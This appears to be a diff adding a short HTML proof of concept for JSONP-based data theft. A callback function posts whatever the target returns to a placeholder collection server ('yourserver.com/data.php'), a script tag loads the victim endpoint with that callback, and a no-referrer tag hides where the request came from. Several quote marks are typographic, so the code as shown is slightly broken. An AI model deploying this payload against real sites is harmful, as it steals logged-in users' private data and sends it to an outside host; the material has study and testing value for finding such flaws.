@@ -1,0 +1,26 @@
+<html>    
+<head><meta name=”referrer” content=”no-referrer”></head>
+
+    <script>
+
+    function call_me(response) {
+    var http = new XMLHttpRequest();
+    var url = ‘https://yourserver.com/data.php';
+    var params = ‘data=’+JSON.stringify(response);
+
+    http.open(‘POST’, url, true);
+
+    http.setRequestHeader(‘Content-type’, ‘application/x-www-form-urlencoded’);
+
+    http.onreadystatechange = function() {
+    if(http.readyState == 4 && http.status == 200) {
+    console.log(http.responseText);
+    }
+    }
+    http.send(params);
+    }
+
+    </script>
+    <script src=”https://victim_here?callback=call_me"></script>
+</html>
+
